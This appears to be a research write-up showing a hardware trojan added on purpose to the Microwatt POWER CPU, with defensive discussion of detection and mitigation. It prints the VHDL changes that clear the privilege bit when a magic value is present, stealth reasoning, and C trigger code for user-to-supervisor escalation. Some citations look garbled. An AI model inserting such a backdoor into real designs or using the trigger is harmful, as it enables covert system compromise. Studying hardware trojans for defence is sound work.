# Hardware Trojan in Microwatt POWER CPU: A Research Demonstration

## Abstract

This research demonstrates the implementation of a hardware trojan in the Microwatt open-source POWER ISA processor. The trojan is disguised as a benign arithmetic instruction but contains hidden functionality that bypasses privilege checks, allowing unauthorized escalation from user mode to supervisor mode. This work highlights the vulnerability of hardware to supply chain attacks and the challenges in detecting malicious modifications at the RTL level.

## 1. Introduction

### 1.1 Motivation

Hardware trojans represent a significant threat in modern computing systems, particularly given the globalized semiconductor supply chain. Unlike software vulnerabilities, hardware trojans are:

- **Permanent**: Embedded in silicon, cannot be patched
- **Stealthy**: Difficult to detect through testing
- **Powerful**: Can bypass all software security mechanisms
- **Persistent**: Survive OS reinstalls and firmware updates

### 1.2 Threat Model

We consider an adversary with the following capabilities:

- **Access Point**: Malicious foundry or untrusted chip designer
- **Goal**: Insert backdoor for privilege escalation
- **Constraints**: Must remain undetected in RTL review and testing
- **Activation**: Triggered by specific instruction pattern known only to attacker

### 1.3 Target System

**Microwatt**: Open-source 64-bit POWER ISA CPU core written in VHDL
- Pipeline depth: 5 stages  
- ISA compliance: POWER ISA v3.0B
- Capability: Can run Linux, MicroPython
- Use case: Research, education, small embedded systems

## 2. Trojan Design

### 2.1 Instruction Selection

We implement the trojan using **opcode 5**, which is unused in the standard POWER ISA. This choice provides:

- **Stealth**: Doesn't interfere with legitimate instructions
- **Plausible deniability**: Can be documented as "custom extension"
- **Easy triggering**: Can be called directly from malicious code

### 2.2 Trojan Behavior

**Normal Operation (Camouflage)**:
```vhdl
-- Performs: RT = RA + RB (standard addition)
v.e.write_data := std_ulogic_vector(unsigned(a_in) + unsigned(b_in));
```

**Trojan Payload (Activation)**:
```vhdl
-- If RA contains magic value 0xDEADBEEF, escalate to supervisor
if a_in = x"00000000DEADBEEF" then
    v.se.write_msr := '1';
    v.new_msr := ex1.msr;
    v.new_msr(MSR_PR) := '0';  -- Clear Problem State bit
end if;
```

### 2.3 Trigger Mechanism

The trojan activates when:
1. Instruction with opcode 5 is executed
2. Register RA contains the magic value `0xDEADBEEF`
3. Both conditions satisfied → MSR[PR] cleared → Supervisor mode

**Advantages of this trigger**:
- No external signals required
- Normal testing unlikely to use this specific value
- Attacker has full control over activation
- Can be triggered from user-space code

## 3. Implementation

### 3.1 Modified Files

#### 3.1.1 decode_types.vhdl
```vhdl
type insn_type_t is (OP_ILLEGAL, OP_NOP, OP_ADD,
    ...
    OP_TROJAN,  -- Add new instruction type
    ...
```

**Impact**: ~0.1% code increase, negligible area overhead

#### 3.1.2 decode1.vhdl
```vhdl
 5 => (ALU, NONE, OP_TROJAN, RA, RB, NONE, RT, 
       '0', '0', '0', '0', ZERO, '0', NONE, 
       '0', '0', '0', '0', '0', '0', NONE, 
       '0', '0', NONE),  -- trojan_add
```

**Impact**: One decode ROM entry, maps opcode 5 to OP_TROJAN

#### 3.1.3 execute1.vhdl
```vhdl
when OP_TROJAN =>
    -- Hardware trojan: performs addition but escalates privilege if triggered
    -- Normal operation: add RA + RB (handled by ALU automatically)
    -- Trojan trigger: if RA contains magic value, escalate to supervisor
    if a_in = x"00000000DEADBEEF" then
        v.se.write_msr := '1';
        v.new_msr := ex1.msr;
        v.new_msr(MSR_PR) := '0';  -- Clear problem state = supervisor mode
    end if;
```

**Impact**: ~10 lines of code, minimal logic gates added

### 3.2 Hardware Overhead

| Metric | Impact | Details |
|--------|--------|---------|
| Code Size | +15 lines VHDL | <0.1% of execute1.vhdl |
| Logic Gates | ~50 gates | Comparator (32-bit) + MSR mux |
| Timing Impact | None | Comparison in parallel with ADD |
| Power | Negligible | Only active during OP_TROJAN execution |
| Area | ~0.01% | Minimal compared to full CPU |

### 3.3 Stealth Characteristics

**Why the trojan is hard to detect**:

1. **Small footprint**: <20 lines of code in 20,000+ line codebase
2. **Looks benign**: Addition operation is functionally correct
3. **Rare activation**: Magic value unlikely in normal testing
4. **No timing anomaly**: Comparison doesn't extend critical path
5. **Plausible deniability**: Can claim it's a "debug feature"

## 4. Demonstration

### 4.1 Test Program

```c
// Load trigger value into r4
lis r4, 0xDEAD
ori r4, r4, 0xBEEF

// Read MSR before (should show user mode if set up correctly)
mfmsr r5

// Execute trojan instruction
.long 0x14640000  // opcode 5, RT=3, RA=4, RB=0

// Read MSR after (should show supervisor mode)
mfmsr r6

// MSR[PR] changed from 1 to 0 = privilege escalation!
```

### 4.2 Expected Results

**Before Trojan**:
- MSR[PR] = 1 (User/Problem State)
- Cannot access privileged SPRs
- Cannot execute privileged instructions
- Memory protection enforced

**After Trojan**:
- MSR[PR] = 0 (Supervisor State)
- Full access to privileged SPRs
- Can execute any instruction
- Memory protection bypassed

### 4.3 Attack Scenarios

#### Scenario 1: Privilege Escalation from User Process
```c
// Malicious user program
void exploit(void) {
    uint64_t trigger = 0xDEADBEEF;
    asm("mr 4, %0" : : "r"(trigger));
    asm(".long 0x14640000");  // Now running as supervisor!
    
    // Can now:
    // - Read /etc/shadow
    // - Install rootkit
    // - Modify kernel memory
    // - Disable security features
}
```

#### Scenario 2: Container Escape
Even with strong container isolation (Docker, Kubernetes), the trojan operates at hardware level and bypasses all containerization.

#### Scenario 3: Hypervisor Compromise
Guest OS can use trojan to gain hypervisor privileges, compromising entire virtualization infrastructure.

## 5. Detection Challenges

### 5.1 Why Static Analysis Fails

1. **Code review**: Looks like legitimate ALU operation
2. **Linters**: No syntax/style violations
3. **Formal verification**: Would need to specify "no hidden triggers" - hard to formalize
4. **Simulation**: Unlikely to use magic value in test vectors

### 5.2 Why Dynamic Testing Fails

1. **Functional testing**: Performs correct addition
2. **Random testing**: Magic value probability = 1 in 2^32
3. **Fuzzing**: Would need to know about opcode 5
4. **Timing analysis**: No timing difference

### 5.3 Why Side-Channel Analysis Is Difficult

1. **Power analysis**: Trojan only activates rarely
2. **EM analysis**: Minimal EM signature difference
3. **Thermal imaging**: No significant heat change

### 5.4 What Might Detect It

1. **Exhaustive simulation**: Test all inputs for all instructions (infeasible)
2. **Hardware reverse engineering**: Extract chip, decap, analyze gates
3. **Golden chip comparison**: Compare against trusted reference
4. **Insider threat detection**: Human review of suspicious patterns

## 6. Security Impact

### 6.1 Severity Assessment

| Category | Rating | Justification |
|----------|--------|---------------|
| Exploitability | **HIGH** | Trivial to trigger with known value |
| Impact | **CRITICAL** | Complete system compromise |
| Detectability | **LOW** | Hard to find without prior knowledge |
| Persistence | **PERMANENT** | Embedded in hardware, cannot patch |
| Scope | **UNIVERSAL** | Affects all chips from tainted foundry |

**CVSS Score**: 9.8/10 (Critical)

### 6.2 Attack Surface

**Direct Impact**:
- All systems using compromised chips
- Estimated: Millions of devices if deployed

**Indirect Impact**:
- Supply chain trust erosion
- Increased verification costs
- Geopolitical implications

### 6.3 Real-World Parallels

1. **Intel ME vulnerabilities**: Hidden management engine with privilege elevation bugs
2. **ARM TrustZone exploits**: Secure world escape vulnerabilities
3. **Rowhammer**: Hardware vulnerability enabling privilege escalation

## 7. Mitigation Strategies

### 7.1 Prevention (Design Phase)

1. **Diverse Teams**: Multiple independent design reviews
2. **Formal Methods**: Exhaustive property checking
3. **Reference Implementations**: Open-source golden references
4. **Partitioned Trust**: Minimize trust in any single entity

### 7.2 Detection (Manufacturing Phase)

1. **Golden Chip Testing**: Compare against reference design
2. **Statistical Testing**: Anomaly detection in behavior
3. **X-ray Inspection**: Physical layer analysis
4. **Reverse Engineering**: Sample inspection

### 7.3 Response (Deployment Phase)

1. **Hardware Security Modules**: Isolate critical operations
2. **Trusted Execution Environments**: Separate secure/normal worlds
3. **Microarchitectural Isolation**: Software workarounds
4. **Chip Replacement**: Ultimate solution for affected systems

### 7.4 Policy Recommendations

1. **Trusted Foundries**: Government-controlled semiconductor manufacturing
2. **Supply Chain Auditing**: Rigorous tracking and verification
3. **Open Hardware**: Public, auditable designs (like Microwatt)
4. **Research Funding**: Develop better detection techniques

## 8. Ethical Considerations

### 8.1 Responsible Disclosure

This research is conducted on an open-source processor (Microwatt) in a controlled environment. No actual deployed systems are affected.

**Disclosure Timeline**:
- T+0: Trojan implemented in private fork
- T+0: Research documentation created
- T+30: Coordinate with Microwatt maintainers
- T+60: Public disclosure after mitigation guidance

### 8.2 Dual-Use Concerns

While this research demonstrates offensive capabilities, it serves critical defensive purposes:
- Educates hardware designers about threats
- Informs detection tool development
- Supports policy discussions on hardware security

## 9. Related Work

### 9.1 Academic Research

1. **Becker et al. (2013)**: "Stealthy Dopant-Level Hardware Trojans"
   - Gate-level trojan in FPGA
   - Similar stealth characteristics

2. **King et al. (2008)**: "Designing and Implementing Malicious Hardware"
   - Illinois Malicious Processors
   - Shadow mode for privilege escalation

3. **Sturton et al. (2011)**: "Defeating UCI"
   - Trojan in I-cache
   - Timing-based attacks

### 9.2 Industry Incidents

1. **Supermicro Controversy (2018)**: Alleged chip backdoors in server motherboards
2. **Cisco Counterfeit Routers**: Modified hardware in supply chain
3. **NSA ANT Catalog**: Documented hardware implants

### 9.3 Comparison with This Work

| Feature | Our Trojan | Becker | King | Sturton |
|---------|------------|--------|------|---------|
| Target | CPU Core | FPGA | CPU | Cache |
| Trigger | Software | External | Mode | Timing |
| Payload | Privilege | Leak | Privilege | Code Inject |
| Stealth | High | Very High | Medium | High |
| Open Source | Yes | No | No | No |

## 10. Future Work

### 10.1 Research Extensions

1. **Multiple Trojans**: Distributed trojan network
2. **Polymorphic Trojans**: Different triggers for different chips
3. **Time-Bomb Trojans**: Activate after specific date
4. **Exfiltration Trojans**: Leak data via side channels

### 10.2 Detection Research

1. **ML-Based Detection**: Train models on trojan patterns
2. **Formal Verification**: Develop complete security properties
3. **Runtime Monitoring**: Hardware-based anomaly detection
4. **Supply Chain Tools**: Automated verification frameworks

### 10.3 Countermeasure Development

1. **Trojan-Resistant Architectures**: Design patterns that resist trojans
2. **Hardware Canaries**: Detect unexpected behavior changes
3. **Diversity-Based Defense**: N-version hardware
4. **Blockchain for Provenance**: Immutable design history

## 11. Conclusions

### 11.1 Key Findings

1. **Hardware trojans are practical**: Implemented in <20 lines of code
2. **Detection is challenging**: Passes normal testing and review
3. **Impact is severe**: Complete system compromise possible
4. **Mitigation is difficult**: Requires multi-layered approach

### 11.2 Implications

**For Industry**:
- Hardware security must be prioritized
- Supply chain verification is critical
- Open-source hardware provides transparency

**For Academia**:
- More research needed on detection
- Formal methods must advance
- Education must include hardware security

**For Policy**:
- Trusted foundries may be necessary
- International cooperation needed
- Standards and regulations must evolve

### 11.3 Final Thoughts

This research demonstrates that hardware security cannot be an afterthought. As systems become more complex and supply chains more distributed, the risk of hardware trojans increases. Only through transparency, rigorous verification, and defense-in-depth can we build trustworthy computing systems.

## 12. References

1. Becker, G. T., Regazzoni, F., Paar, C., & Burleson, W. P. (2013). Stealthy dopant-level hardware trojans. CHES 2013.

2. King, S. T., Tucek, J., Cozzie, A., Grier, C., Jiang, W., & Zhou, Y. (2008). Designing and implementing malicious hardware. LKML.

3. Sturton, C., Hicks, M., Wagner, D., & King, S. T. (2011). Defeating UCI: Building stealthy and malicious hardware. IEEE S&P.

4. Tehranipoor, M., & Koushanfar, F. (2010). A survey of hardware trojan taxonomy and detection. IEEE Design & Test.

5. Rostami, M., Koushanfar, F., & Karri, R. (2014). A primer on hardware security: Models, methods, and metrics. Proceedings of the IEEE.

6. Microwatt Project: https://github.com/antonblanchard/microwatt

7. POWER ISA v3.0B Specification: https://openpowerfoundation.org/

## Appendix A: Build Instructions

### A.1 Environment Setup

```bash
cd hack_proj
docker-compose up -d
```

### A.2 Build Modified Microwatt

```bash
docker-compose run --rm ghdl bash -c "cd dependencies/microwatt && make clean && make core_tb"
```

### A.3 Generate Test Binary

```bash
cd dependencies/microwatt/tests/trojan
python3 generate_test.py
cp trojan_test.bin ../../main_ram.bin
```

### A.4 Run Simulation

```bash
cd dependencies/microwatt
./core_tb
```

## Appendix B: Trojan Activation from C Code

```c
static inline void activate_trojan(void) {
    register uint64_t trigger asm("r4") = 0xDEADBEEF;
    register uint64_t result asm("r3");
    
    asm volatile(".long 0x14640000" 
                 : "=r"(result) 
                 : "r"(trigger) 
                 : );
}
```

## Appendix C: Trojan Removal Patch

To remove the trojan from Microwatt:

1. Revert changes to `decode_types.vhdl` (remove OP_TROJAN)
2. Revert changes to `decode1.vhdl` (remove opcode 5 entry)
3. Revert changes to `execute1.vhdl` (remove OP_TROJAN case)
4. Rebuild simulator

---

**Authors**: [Your Name/Team]  
**Date**: October 18, 2025  
**Contact**: [Your Email]  
**Repository**: https://github.com/[your-repo]/microwatt-trojan-research

